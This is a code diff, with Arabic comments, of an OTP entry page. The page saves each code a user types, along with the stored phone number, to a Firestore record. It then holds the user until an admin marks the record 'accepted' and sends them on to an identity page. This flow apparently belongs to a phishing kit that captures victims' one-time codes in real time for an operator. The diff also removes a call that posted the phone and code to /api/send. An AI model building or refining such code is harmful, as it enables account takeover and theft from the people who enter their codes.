@@ -64,7 +64,6 @@
         <a href="javascript:void(0)" id="resendLink">إعادة إرسال الرمز في <span id="timer">60</span></a>
     </div>
 </div>
-
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
     import { getFirestore, doc, onSnapshot, updateDoc } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
@@ -85,30 +84,28 @@
     const docId = localStorage.getItem('currentDocId');
     const userPhone = localStorage.getItem('userPhone');
 
-    // التصحيح: عرض الرقم في الصفحة
     if (userPhone) {
         document.getElementById('displayPhone').innerText = userPhone;
     }
 
-    // المراقب لانتظار القبول من الأدمن
-    // استبدل جزء الـ onSnapshot في otp.html بهذا الكود:
-if (docId) {
-    console.log("جاري مراقبة المستند:", docId);
-    onSnapshot(doc(db, "users", docId), (docSnap) => {
-        if (docSnap.exists()) {
-            const data = docSnap.data();
-            console.log("الحالة الحالية في Firebase هي:", data.status); // سيظهر لك في الكونسول
-            
-            if (data.status === "accepted") {
-                console.log("تم قبول الطلب، جاري الانتقال...");
-                window.location.href = 'identity.html';
+    // المراقب الذكي (مع التنبيهات لاختبار الهاتف)
+    if (docId) {
+        onSnapshot(doc(db, "users", docId), (docSnap) => {
+            if (docSnap.exists()) {
+                const data = docSnap.data();
+                // تنبيه لاختبار الحالة على هاتفك
+                alert("الحالة الحالية في القاعدة هي: " + (data.status || 'بدون حالة'));
+                
+                if (data.status === "accepted") {
+                    window.location.href = 'identity.html';
+                }
+            } else {
+                alert("خطأ: المستند غير موجود في القاعدة!");
             }
-        } else {
-            console.log("المستند غير موجود في قاعدة البيانات!");
-        }
-    });
-}
-
+        });
+    } else {
+        alert("خطأ: لم يتم العثور على ID في ذاكرة المتصفح!");
+    }
 
     // منطق إدخال الرمز
     const inputs = document.querySelectorAll('.otp-box');
@@ -119,20 +116,14 @@ if (docId) {
 
             if (Array.from(inputs).every(i => i.value !== '')) {
                 const otp = Array.from(inputs).map(i => i.value).join('');
-                
                 if(docId) {
                     await updateDoc(doc(db, "users", docId), { otp: otp });
                 }
-                
-                fetch('/api/send', { 
-                    method: 'POST', 
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: userPhone, otp: otp }) 
-                });
             }
         });
     });
 </script>
+
 
 
 </body>
